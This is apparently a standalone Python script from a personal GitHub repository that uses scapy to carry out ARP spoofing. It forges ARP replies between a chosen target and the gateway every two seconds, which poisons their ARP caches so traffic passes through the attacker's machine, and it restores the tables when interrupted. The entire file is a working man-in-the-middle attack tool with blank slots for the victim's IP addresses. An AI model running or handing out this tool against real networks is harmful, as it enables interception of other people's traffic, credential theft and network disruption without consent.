# Javi Ferrándiz | github - https://github.com/javisys | Updated on 12/08/2024
import scapy.all as scapy
import time

def get_mac(ip):
    arp_req = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast / arp_req
    answered_list = scapy.srp(arp_req_broadcast, timeout = 5, verbose = False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"Could not obtain the MAC for the IP {ip}")
        return None

def spoofing(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"Spoofing could not be performed for {target_ip}.")
        return
    
    paquete = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    scapy.send(paquete, verbose = False)

def restart(destination_ip, src_ip):
    destination_mac = get_mac(destination_ip)
    src_mac = get_mac(src_ip)

    if destination_mac is None or src_mac is None:
        print(f"Failed to restore the ARP table for {destination_ip} o {src_ip}.")
        return
    
    paquete = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = src_ip, hwsrc = src_mac)
    scapy.send(paquete, verbose = False)

# Poner la IP del objetivo y la IP del gateway
target_ip = ""  # Target IP
gateway_ip = ""  # Gateway

if not target_ip or not gateway_ip:
    print("[!!!] The IPs of the target and gateway must be defined.")
else:
    try:
        sent_packets_count = 0
        while True:
            spoofing(target_ip, gateway_ip)
            spoofing(gateway_ip, target_ip)
            sent_packets_count += 2
            print("\r[*] Packets Sent " + str(sent_packets_count), end ="")
            time.sleep(2)  # Wait two seconds

    except KeyboardInterrupt:
        print("\nCtrl + C presionado.............Saliendo")
        restart(target_ip, gateway_ip)
        restart(gateway_ip, target_ip)
        print("[*] ARP Spoof stopped")

